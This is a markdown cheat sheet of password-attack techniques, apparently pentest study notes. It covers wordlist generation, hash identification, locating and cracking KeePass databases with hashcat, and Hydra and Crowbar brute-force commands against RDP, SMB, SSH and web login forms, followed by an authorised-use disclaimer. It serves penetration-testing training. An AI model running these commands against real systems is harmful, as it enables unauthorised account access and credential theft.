# 🔐 Password Attacks & Brute Force 

> **GitHub‑ready notes** covering wordlist generation, hash identification, password cracking, and online brute‑force attacks.

---

## 📚 Generating Wordlists

### 🔹 CeWL – Custom Wordlist Generator

Generate wordlists based on content from a target website.

```bash
cewl <domain> -w wordlist.txt
```

**Example:**

```bash
cewl https://example.com -w example_words.txt
```

---

### 🔹 Crunch – Wordlist Generator

#### Character Translation

| Symbol | Meaning                              |
| ------ | ------------------------------------ |
| `@`    | Lowercase letters (a–z)              |
| `,`    | Uppercase letters (A–Z)              |
| `%`    | Numbers (0–9)                        |
| `^`    | Special characters (including space) |

#### Usage

```bash
crunch <min-len> <max-len> [charset]
```

#### Examples

```bash
crunch 9 9 -t ,@@@@^%%%
```

```bash
crunch 4 6 0123456789abcdef -o wordlist.txt
```

---

### 🔹 John the Ripper – Wordlist Mutation

Add custom rules inside:

```text
/etc/john/john.conf
```

Under the module:

```text
[List.Rules:Wordlist]
```

#### Basic Rule Example

```text
$@$[1-2]$[0-9]$[0-9]$[0-9]
```

#### Apply Rules

```bash
john --wordlist=wordlist.txt --rules --stdout > mutated.txt
```

📖 **Reference:** [https://www.openwall.com/john/doc/RULES.shtml](https://www.openwall.com/john/doc/RULES.shtml)

---

## 🔎 Identifying Hash Types

```bash
hashid <hash>
```

Online Tools:

* [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)
* [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)

---

## 🔑 Hashing Files for Cracking (2john)

Supported formats:

```text
ssh2john
rar2john
zip2john
keepass2john
office2john
pdf2john
pwsafe2john
racf2john
vncpcap2john
hccap2john
keychain2john
mozilla2john
```

---

## 🗄️ Password Manager – KeePass

### 🔍 Search KeePass Database Files (Windows)

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### 🔐 Extract Hash

```bash
keepass2john Database.kdbx > keepass.hash
```

### 🔎 Find Hash Mode (Hashcat)

```bash
hashcat --help | grep -i "KeePass"
```

### 🔓 Crack KeePass Database

```bash
hashcat -m 13400 keepass.hash
```

---

## 🚀 Brute Force Attacks

### 🔹 RDP Brute Force – Hydra

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p "<password>" rdp://<IP>
```

### 🔹 RDP Brute Force – Crowbar

```bash
crowbar -b rdp -s X.X.X.X/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 1
```

---

### 🔹 SMB Brute Force – Hydra

```bash
hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb
```

---

### 🔹 SSH Brute Force – Hydra

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

---

### 🔹 HTTP POST Login Form – Hydra

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> \
http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f
```

---

### 🔹 HTTP GET Login Form – Hydra

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login
```

---

## ⚠️ Disclaimer

These techniques are **strictly for educational purposes, CTFs, labs, and authorized penetration testing only**. Unauthorized use against systems you do not own or have permission to test is illegal.

---

⭐ **Tip:** Combine **CeWL + Crunch + John rules** for highly effective custom wordlists in real‑world engagements.
